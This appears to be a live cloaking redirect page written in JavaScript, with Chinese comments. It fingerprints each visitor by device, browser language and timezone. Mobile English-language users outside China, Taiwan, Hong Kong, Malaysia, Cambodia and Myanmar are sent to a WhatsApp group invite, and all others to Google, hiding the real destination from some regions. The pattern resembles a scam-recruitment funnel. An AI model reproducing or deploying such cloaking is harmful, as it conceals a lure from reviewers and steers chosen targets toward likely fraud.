<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
</head>
<body>
    <script>
        (function() {
            // ========== 获取关键信息 ==========
            
            // 1. 检测是否为手机端
            var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            
            // 2. 获取浏览器语言
            var lang = navigator.language || navigator.userLanguage || '';
            var langs = navigator.languages || [];
            
            // 3. 获取时区
            var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            // ========== 屏蔽国家/地区时区列表 ==========
            
            var blockedTZ = [
                // 中国
                'Asia/Shanghai', 'Asia/Chongqing', 'Asia/Harbin', 'Asia/Urumqi',
                // 台湾
                'Asia/Taipei',
                // 香港
                'Asia/Hong_Kong',
                // 马来西亚
                'Asia/Kuala_Lumpur', 'Asia/Kuching',
                // 柬埔寨
                'Asia/Phnom_Penh',
                // 缅甸
                'Asia/Yangon', 'Asia/Rangoon'
            ];
            
            // ========== 屏蔽国家/地区语言检测 ==========
            
            var isBlockedLang = lang.startsWith('zh') || 
                                lang.startsWith('zh-TW') ||
                                lang.startsWith('zh-HK') || 
                                lang.startsWith('yue') ||
                                lang.startsWith('ms') || 
                                lang.startsWith('ms-MY') ||
                                lang.startsWith('km') || 
                                lang.startsWith('my') ||
                                langs.some(function(l) { 
                                    return l.startsWith('zh') || 
                                           l.startsWith('zh-TW') ||
                                           l.startsWith('zh-HK') || 
                                           l.startsWith('yue') ||
                                           l.startsWith('ms') || 
                                           l.startsWith('ms-MY') ||
                                           l.startsWith('km') || 
                                           l.startsWith('my');
                                });
            
            // ========== 判断条件 ==========
            
            // 是否为英文
            var isEnglish = lang.substr(0, 2).toLowerCase() === 'en';
            
            // 是否为屏蔽时区
            var isBlockedTZ = blockedTZ.indexOf(tz) !== -1;
            
            // ========== 最终决策 ==========
            
            // 目标：手机端 + 英文 + 不是屏蔽时区 + 不是屏蔽语言
            var shouldRedirect = isMobile && 
                                 isEnglish && 
                                 !isBlockedTZ && 
                                 !isBlockedLang;
            
            // ========== 跳转执行 ==========
            
            var targetUrl = "https://chat.whatsapp.com/GuCKEF5DbkoEqEcS0VHjjC";
            var fallbackUrl = "https://www.google.com";
            
            window.location.replace(shouldRedirect ? targetUrl : fallbackUrl);
        })();
    </script>
</body>
</html>
